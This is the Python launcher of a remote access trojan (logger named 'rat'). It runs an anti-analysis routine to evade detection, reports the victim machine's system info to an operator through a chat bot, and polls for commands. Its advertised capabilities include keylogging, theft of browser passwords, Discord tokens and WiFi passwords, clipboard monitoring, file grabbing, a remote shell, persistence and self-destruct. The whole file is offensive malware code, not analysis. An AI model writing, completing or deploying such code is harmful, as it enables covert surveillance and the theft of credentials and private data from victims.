import sys
import os
import logging

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("rat")

try:
    from modules.main import bot, ADMIN_ID, sysinfo, main_kb
    from modules.anti import anti_analysis
except Exception as e:
    log.error("import failed: %s", e)
    raise

if __name__ == "__main__":
    try:
        anti_analysis()
    except Exception as e:
        log.warning("anti_analysis failed: %s", e)
    try:
        info = sysinfo()
        caps = (
            "Capabilities:\n"
            "- System info + geo\n"
            "- Screenshot / Webcam\n"
            "- Keylogger (ON/OFF/Dump)\n"
            "- Passwords (Chrome/Edge/Brave/Opera/Vivaldi/Yandex + ABE)\n"
            "- Discord tokens\n"
            "- WiFi passwords\n"
            "- Clipboard monitor\n"
            "- File grabber\n"
            "- Remote shell\n"
            "- Download / Upload\n"
            "- Message box\n"
            "- Persistence\n"
            "- Self-destruct"
        )
        bot.send_message(ADMIN_ID, f"online\n{info}\n\n{caps}", reply_markup=main_kb())
        log.info("startup message sent to %s", ADMIN_ID)
    except Exception as e:
        log.warning("startup message failed: %s", e)
    log.info("polling started")
    bot.infinity_polling(timeout=90, long_polling_timeout=90, interval=7)
